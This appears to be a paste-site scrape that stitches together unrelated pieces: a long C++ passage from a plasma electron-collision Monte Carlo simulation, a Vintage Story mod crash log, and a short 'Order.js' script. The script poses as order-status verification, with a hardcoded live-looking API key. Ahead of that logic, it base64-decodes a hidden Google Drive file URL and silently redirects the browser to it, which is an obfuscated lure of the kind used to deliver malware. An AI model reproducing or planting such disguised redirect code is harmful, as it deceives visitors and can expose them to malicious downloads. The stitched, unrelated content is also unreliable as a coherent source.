                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh1;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector
                if (!exc_1.empty()) {
                    std::swap(exc_1[index], exc_1.back());
                    exc_1.pop_back();
                    N_He++;
                }
                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh2) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh2;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    if (N_He > 0) {
                        exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh2;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                if (!exc_2.empty()) {
                    std::swap(exc_2[index], exc_2.back());
                    exc_2.pop_back();
                    N_He++;
                }

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }

//         // ----- -------now begin e-e collisions ------ /////

//         // Reshuffle electron indices for random pairing for e-e collisions
//         std::shuffle(electron_indices.begin(), electron_indices.end(), gen);

//         int max_pairs = n_e/2; // each electron collides 
        
//         for (int i = 0; i < max_pairs; i++){

//             int id1 = electron_indices[2 * i];
//             int id2 = electron_indices[2 * i + 1];
//             if (id1 >= n_e || id2 >= n_e) continue; // Handle edge case

//             Electron& e1 = electrons[id1];
//             Electron& e2 = electrons[id2];

//             if (e1.collided_ee || e2.collided_ee) continue; //handle already collided cases

//             double E_initial = e1.energy + e2.energy; // total initial energy of pair to check the energy conservation

//             // generating random variables to calculate random direction of center-of-mass after the collision

//             double R1 = dis(gen);
//             double R2 = dis(gen);        

//             // ----   Collision energy redistribution module

//             // first particle X Y Z initial velocities
//             double V0_x_1 = e1.vx;
//             double V0_y_1 = e1.vy;
//             double V0_z_1 = e1.vz;
//             // second particle X Y Z initial velocities
//             double V0_x_2 = e2.vx;
//             double V0_y_2 = e2.vy;
//             double V0_z_2 = e2.vz;

//             // file13 << ""V0_x_1: "" << V0_x_1 << "" "" << ""V0_y_1: "" << V0_y_1 << "" "" << "" V0_z_1: "" << V0_z_1 << "" "";
//             // file13 << ""V0_x_2: "" << V0_x_2 << "" "" << ""V0_y_2: "" << V0_y_2 << "" "" << "" V0_z_2: "" << V0_z_2 << "" "";

//             // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

//             double V0_rel_x = (V0_x_1 - V0_x_2);
//             double V0_rel_y = (V0_y_1 - V0_y_2);
//             double V0_rel_z = (V0_z_1 - V0_z_2);

//             if(std::isnan(V0_x_1) || std::isinf(V0_x_1) || fabs(V0_x_1) < 1e-12 || std::isnan(V0_y_1) || std::isinf(V0_y_1) || fabs(V0_y_1) < 1e-12 || std::isnan(V0_z_1) || std::isinf(V0_z_1) || fabs(V0_z_1) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_x computed: "" << V0_rel_x << "" at timestep "" << t << std::endl;
//                 std::cerr << ""Components of velocities: Vx, Vy, Vz forr the first electron: "" << V0_x_1 << "" "" << V0_y_1 << "" "" << V0_z_1 << ""\n"";
//             //    continue;
//             }

//             if(std::isnan(V0_x_2) || std::isinf(V0_x_2) || fabs(V0_x_2) < 1e-12 || std::isnan(V0_y_2) || std::isinf(V0_y_2) || fabs(V0_y_2) < 1e-12 || std::isnan(V0_z_2) || std::isinf(V0_z_2) || fabs(V0_z_2) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_x computed: "" << V0_rel_x << "" at timestep "" << t << std::endl;
//                 std::cerr << ""Components of velocities: Vx, Vy, Vz forr the second electron: "" << V0_x_2 << "" "" << V0_y_2 << "" "" << V0_z_2 << ""\n"";
//             //    continue;
//             }    

//             if(std::isnan(V0_rel_y) || std::isinf(V0_rel_y) || fabs(V0_rel_y) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_y computed: "" << V0_rel_y << "" at timestep "" << t << std::endl;
//                 continue;
//             }     
//             if(std::isnan(V0_rel_z) || std::isinf(V0_rel_z) || fabs(V0_rel_z) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_z computed: "" << V0_rel_z << "" at timestep "" << t << std::endl;
//                 continue;
//             }              


//             double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);
//             double V0_rel_normal = sqrt(V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

//             // file13 << ""V0_rel: "" << V0_rel << "" "" << ""V0_rel_normal: "" << V0_rel_normal << "" "";

//             if(std::isnan(V0_rel) || std::isinf(V0_rel) || fabs(V0_rel) < 1e-12){
//                 std::cerr << ""Invalid V0_rel computed: "" << V0_rel << "" at timestep "" << t << std::endl;
//                 V0_rel = 1.0E-6;
//                 e1.collided_ee = true;
//                 e2.collided_ee = true;
//                 continue;
//             }
            
//             if(std::isnan(V0_rel_normal) || std::isinf(V0_rel_normal) || fabs(V0_rel_normal) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_normal computed: "" << V0_rel << "" at timestep "" << t << std::endl;
//                 continue;
//             }                        

//             // calculating spherical angles for center-of-mass random direction
//             double theta = acos(1.0- 2.0*R1);
//             double phi = 2*M_PI*R2;

//             // calcluating h for equations 20a, 20b (Nanbu1995)

//             double eps = 2*M_PI*R1;

//             double h_x = V0_rel_normal*cos(eps);
//             double h_y = -(V0_rel_y*V0_rel_x*cos(eps) + V0_rel*V0_rel_z*sin(eps))/V0_rel_normal;
//             double h_z = -(V0_rel_z*V0_rel_x*cos(eps) - V0_rel*V0_rel_y*sin(eps))/V0_rel_normal;    

//             //  calculating s (Nanbu1995 eq 19)

//             double s = Coulomb_log/(4.0*M_PI) * pow((q*q/(epsilon_0*(m_e/2))),2) * (n_e/Volume) * pow(V0_rel,-3) * dt;

//             // file13 << ""s: "" << s << "" "";

//             if(std::isnan(s) || std::isinf(s) || fabs(s) < 1e-12){
//                 std::cerr << ""Invalid s computed: "" << s << "" at timestep "" << t << std::endl;
//                 continue;
//             }

//             double A = solve_A(s);   

//             if(std::isnan(A) || std::isinf(A) || fabs(A) < 1e-12){
// //                std::cerr << ""Invalid A computed: "" << A << "" at timestep "" << t << std::endl;
//                 A = 1.0E-12;
// //                continue;
//             }


//             // calculating cos(khi) (Nanbu1995 eq 17)
//             double cos_khi = 0.0;
//             double sin_khi = 0.0;
            
//             if (s < 1.0E-2 & R1 != 0.0) {// taking care of small s  
//                 cos_khi = 1.0 + s*log(R1);    
//             }
//             else {
//                 cos_khi = (1.0/A)*log(exp(-A) + 2.0*R1*sinh(A));
//             }

//             if (cos_khi > 1.0)
//                 cos_khi = 1.0;

//             sin_khi = sqrt(1.0 - cos_khi*cos_khi);


//             //calculating final velocity of first particle

//             double V_x_1 = V0_x_1 - 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
//             double V_y_1 = V0_y_1 - 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
//             double V_z_1 = V0_z_1 - 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

//             double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

//             //calculating final velocity of second particle

//             double V_x_2 = V0_x_2 + 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
//             double V_y_2 = V0_y_2 + 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
//             double V_z_2 = V0_z_2 + 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

//             double V_2 = sqrt(V_x_2*V_x_2 + V_y_2*V_y_2 + V_z_2*V_z_2);

//             // updating velocities

//             e1.vx = V_x_1; 
//             e1.vy = V_y_1;
//             e1.vz = V_z_1;

//             e2.vx = V_x_2; // Update velocity components
//             e2.vy = V_y_2;
//             e2.vz = V_z_2;

//             // calculating final energies of first and second colliding particles

//             e1.energy = V_1*V_1*m_e/(2.0*q);
//             e2.energy = V_2*V_2*m_e/(2.0*q);           

//             double E_final = e1.energy + e2.energy;


//             // if(fabs(E_final - E_initial) > 1e-6) {
//             //     std::cerr << ""Energy conservation violation: "" << E_final - E_initial << "" eV\n"";
//             // }

//             // --- collision energy redistrubution module ends  

//             // collision counters handling

//             ee_coll_counter++;
//             e1.collided_ee = true;
//             e2.collided_ee = true;

//         }
//         //////----------------------e-e coulomb collision ends --------------/////////////////

        /// -- electrin field heating along E-Z axis begin--- ///
        for (int idx : electron_indices) {

            // Update velocity component due to electric field
            double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * dt;

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = 0.5 * m_e * (vx*vx + vy*vy + vz*vz) / q;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        /// ---- data writing starts -----------////////////

            // if ((t%print_interval == 0) || (t == steps - 1)){
            // // open datafiles to write each time step to see evolution
            // std::ostringstream filename;
            // filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

            // std::ofstream file(filename.str());
            // if (!file.is_open()){
            // std::cerr << ""Error opening file: "" << filename.str() << std::endl;
            // return 1;
            // }
            // // end opening datafiles for each timestep
            
            // // creating histogram each timestep
            // for (int i = 0; i < n_e; i++){
            //     int bin = (int)( (electrons[i].energy - Emin)/bin_width_smooth );
            //     if (bin >=0 && bin < N)
            //     histo_maxwell[bin]++;
            // }

            // // writing data each time step
            // for (int i = 0; i < N_smooth; i++){
            //     double bin_center = Emin + (i + 0.5) * bin_width_smooth;
            //     file << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; //f(E)
            //     histo_maxwell[i] = 0;
            // }

            // //     //instead, writing energies each timestep:

            // // for (int i = 0; i < n_e; i++){
            // //     file << i << "" "" << electrons[i].energy << ""\n"";
            // // }


            // file.close();

            // }


            // end writing data each timestep

            // std::cout << ""number excitation collisions at timestep: "" << t << "" "" << ""is: "" << exc2_coll_counter_temp << ""\n"";             
            // std::cout << ""number superelatic collisions at timestep: "" << t << "" "" << ""is: "" << super2_coll_counter_temp << ""\n"";   
            file_temp << t << "" "" <<  super1_coll_counter_temp << "" "" << exc1_coll_counter_temp;
            file_temp << "" "" <<  super2_coll_counter_temp << "" "" << exc2_coll_counter_temp << ""\n"";      

//            file_temp << t << "" "" <<  exc_1.size() << "" "" << exc_2.size() << ""\n"";     


    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";

    // ----- final electron energies distribution ends

    // // ------ excited atoms histogram --------/////

    // for (int i = 0; i < exc_1.size(); i++) {

    //     file14 << i << "" "" << exc_1[i].energy << ""\n"";

    //     int bin = static_cast<int>( (exc_1[i].energy - Emin)/bin_width);
    //     if (bin >=0 && bin < histo_excited.size())
    //         histo_excited[bin]++;        
    // }

    // for (int i = 0; i < histo_excited.size(); i++){

    //     double bin_center = Emin + (i + 0.5) * bin_width;
    //     file15 << bin_center << "" "" <<  static_cast<double>(histo_excited[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)
    // }


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""# of steps: "" << steps << ""\n"";
    std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";

    std::cout << ""triplet:________"" << ""\n"";
    std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";
    std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";

    std::cout << ""singlet:________"" << ""\n"";
    std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";
    std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    std::cout << ""\n"";    

    std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
1xpM5RMb,Crash Log 16/4/2025 Astria Porta,ArttieF,C,Wednesday 16th of April 2025 06:03:14 PM CDT,"Game Version: v1.20.7 (Stable)
4/16/2025 2:31:25PM: Critical error occurred
Loaded Mods: 
System.NullReferenceException: Object reference not set to an instance of an object.
   at AstriaPorta.Content.ItemStargateDebugTablet.OnUnloaded(ICoreAPI api) in C:\Users\wilfe\source\repos\astria_porta\AstriaPorta\AstriaPorta\src\Item\ItemStargateDebugTablet.cs:line 194
   at Vintagestory.Client.NoObf.ClientMain.Dispose() in VintagestoryLib\Client\ClientMain.cs:line 2786
   at Vintagestory.Client.NoObf.ClientMain.DestroyGameSession(Boolean gotDisconnected) in VintagestoryLib\Client\ClientMain.cs:line 2675
   at Vintagestory.Client.GuiScreenConnectingToServer.onCancel() in VintagestoryLib\Client\MainMenu\Screens\GuiScreenConnectingToServer.cs:line 206
   at Vintagestory.API.Client.GuiElementTextButton.OnMouseUpOnElement(ICoreClientAPI api, MouseEvent args) in VintagestoryApi\Client\UI\Elements\Impl\Interactive\Controls\GuiElementTextButton.cs:line 318
   at Vintagestory.API.Client.GuiElementTextButton.OnMouseUp(ICoreClientAPI api, MouseEvent args) in VintagestoryApi\Client\UI\Elements\Impl\Interactive\Controls\GuiElementTextButton.cs:line 306
   at Vintagestory.API.Client.GuiComposer.OnMouseUp(MouseEvent mouse) in VintagestoryApi\Client\UI\GuiComposer.cs:line 447
   at GuiScreen.OnMouseUp(MouseEvent e) in VintagestoryLib\Client\MainMenu\Screens\Special\GuiScreen.cs:line 204
   at Vintagestory.Client.ScreenManager.OnMouseUp(MouseEvent e) in VintagestoryLib\Client\ScreenManager.cs:line 914
   at Vintagestory.Client.NoObf.ClientPlatformWindows.Mouse_ButtonUp(MouseButtonEventArgs e) in VintagestoryLib\Client\ClientPlatform\Input.cs:line 211
   at OpenTK.Windowing.Desktop.NativeWindow.OnMouseUp(MouseButtonEventArgs e)
   at OpenTK.Windowing.Desktop.NativeWindow.MouseButtonCallback(Window* window, MouseButton button, InputAction action, KeyModifiers mods)
--- End of stack trace from previous location ---
   at OpenTK.Windowing.Desktop.NativeWindow.RethrowCallbackExceptionsIfNeeded()
   at OpenTK.Windowing.Desktop.NativeWindow.ProcessWindowEvents(Boolean waitForEvents)
   at OpenTK.Windowing.Desktop.GameWindow.Run()
   at Vintagestory.Client.ClientProgram.Start(ClientProgramArgs args, String[] rawArgs) in VintagestoryLib\Client\ClientProgram.cs:line 334
   at Vintagestory.Client.ClientProgram.<>c__DisplayClass10_0.<.ctor>b__1() in VintagestoryLib\Client\ClientProgram.cs:line 130
   at Vintagestory.ClientNative.CrashReporter.Start(ThreadStart start) in VintagestoryLib\Client\ClientPlatform\ClientNative\CrashReporter.cs:line 93
Game Version: v1.20.7 (Stable)
4/16/2025 3:58:05PM: Critical error occurred
Loaded Mods: aculinaryartillery@1.2.5, angelbelt@1.6.0, antlershorns@1.0.1, axleinblocks@1.20.1-rc.5, betterandimprovedweather@0.1.0, bettercrates@1.8.0, bettertraders@0.0.9, cheesemoredelicious@1.0.0, chiseltools@1.14.16, claycasting@1.2.2, clicktopick@2.0.0, craftablemetalparts@1.0.0, doublebackpackcapacity@0.0.1, dressedtokill@1.2.0, FlexibleTools@3.4.1, goblinears@2.1.1, hangingoillamps@1.0.3, honeypressmittim@1.0.2, millwright@1.2.0, MoreTorchHolders@1.0.0, npclibrary@0.1.2, npcelves@0.0.4, npcgoblins@0.0.1, npchalflings@0.0.4, npchumans@0.0.4, npckobolds@0.0.4, npcorcs@0.0.4, unochre@1.3.0, oils@1.2.3, OresAPlenty@3.3.0, OresAPlentyAddon@1.1.0, primitivesurvival@3.7.6, quicklimepk@1.1.0, RareDenseOres@0.2.7, resmeltableslight@1.1.2, saltandsands@1.1.0, sirixbetterstorage2123@1.1.0, spyglass@0.5.2, tprunes@1.1.1, temporal_gears_stack@1.0.0, game@1.20.7, vsimgui@1.1.8, alchemy@1.6.49, apegrapes@1.2.6, astriaporta@0.0.2, egocaribautomapmarkers@4.0.1, bedspawnv2@1.4.0, BetterCrocksSirix@1.0.2, betterfirepit@1.1.5, betterjonasdevicesfixed@2.0.2, betterpitkilntimer@1.1.0, betterruins@0.4.11, blacksmithenhancements@1.1.4, blastfurnace@1.0.0, carryon@1.8.0-rc.4, coinage@1.13.3, commonlib@2.6.1, composter@1.2.1, compostgrass@1.20.7-dev.2, configlib@1.5.2, Crateful@1.2.8, cropseedstage@1.0.1, cuniculture@1.0.3, danatweaks@3.4.1, electricity@0.0.12, remiel_sawsticks@1.0.0, envelopes@1.2.2, expandedfoods@1.7.4, foodshelves@1.5.3, fromgoldencombs@1.8.12, heatretention@1.0.2, improvedhandbookrecipes@1.1.3, joyofsailing@1.4.0-rc.5, knapster@2.14.4, maketea@0.3.1, metaltongs@1.2.3, meteoricexpansion-reborn@1.3.0, minimalcompass@1.1.3, mobsradar@2.1.6, monstersonlyunderground@1.0.2, morepiles@2.1.3, nocharcoallost@1.0.1, nocokelost@1.0.0, norottinghides@1.0.0, pelaguswinds@1.0.0, petai@3.3.1, pewter@1.2.3, pileful@1.1.5, remotetradercheckmod@0.2.3, simplefootstepsredux@1.0.1, smithingplus@1.6.0-rc.1, solidirondoor@1.0.1, spawnersapi@1.1.3, statushudcont@3.2.6, steamandpower@1.6.4, steelanvil@1.0.0, stirlingmotor@1.0.0, stonebakeoven@1.1.6, vanillamoremolds@1.1.2, versionchecker@1.1.0, vinconomy@0.4.0, creative@1.20.7, vsinstrumentsbase@2.0.1, survival@1.20.7, wildfarmingrevival@1.3.6, advancedchests@0.2.4, apanserbjornstory@0.9.6, autoconfiglib@2.0.6, battletowers@1.0.6, cats@3.2.0, electricityaddon@0.0.20, electricityextensions@0.0.8, em@3.2.1, feverstonewilds@1.5.0-rc.2, helvehammerext@1.7.0, pabrass@1.0.2, paelectrum@1.0.1, pagoldsilver@1.0.2, sandwich@1.2.8, shearlib@1.1.2, stonequarry@3.4.3, wolftaming@3.0.6, tailorsdelight@1.9.5, ashes@1.2.0, wool@1.6.2, dressmakers@1.5.2
System.InvalidOperationException: Can't use a disposed shader!
   at Vintagestory.Client.NoObf.ShaderProgramBase.Use() in VintagestoryLib\Client\ClientPlatform\ShaderProgramBase.cs:line 420
   at AstriaPorta.Content.EventHorizonRenderer.OnRenderFrame(Single deltaTime, EnumRenderStage stage) in C:\Users\wilfe\source\repos\astria_porta\AstriaPorta\AstriaPorta\src\BlockEntityRenderer\EventHorizonRenderer.cs:line 101
   at Vintagestory.Client.NoObf.ClientMain.TriggerRenderStage(EnumRenderStage stage, Single dt) in VintagestoryLib\Client\ClientMain.cs:line 814
   at Vintagestory.Client.NoObf.ClientMain.MainRenderLoop(Single dt) in VintagestoryLib\Client\ClientMain.cs:line 825
   at Vintagestory.Client.GuiScreenRunningGame.RenderToPrimary(Single dt) in VintagestoryLib\Client\MainMenu\Screens\GuiScreenRunningGame.cs:line 161
   at Vintagestory.Client.ScreenManager.Render(Single dt) in VintagestoryLib\Client\ScreenManager.cs:line 695
   at Vintagestory.Client.ScreenManager.OnNewFrame(Single dt) in VintagestoryLib\Client\ScreenManager.cs:line 670
   at Vintagestory.Client.NoObf.ClientPlatformWindows.window_RenderFrame(FrameEventArgs e) in VintagestoryLib\Client\ClientPlatform\GameWindow.cs:line 127
   at OpenTK.Windowing.Desktop.GameWindow.Run()
   at Vintagestory.Client.ClientProgram.Start(ClientProgramArgs args, String[] rawArgs) in VintagestoryLib\Client\ClientProgram.cs:line 334
   at Vintagestory.Client.ClientProgram.<>c__DisplayClass10_0.<.ctor>b__1() in VintagestoryLib\Client\ClientProgram.cs:line 130
   at Vintagestory.ClientNative.CrashReporter.Start(ThreadStart start) in VintagestoryLib\Client\ClientPlatform\ClientNative\CrashReporter.cs:line 93"
mHSCfD71,Order.js,jm33,JavaScript,Wednesday 16th of April 2025 06:01:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68705/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
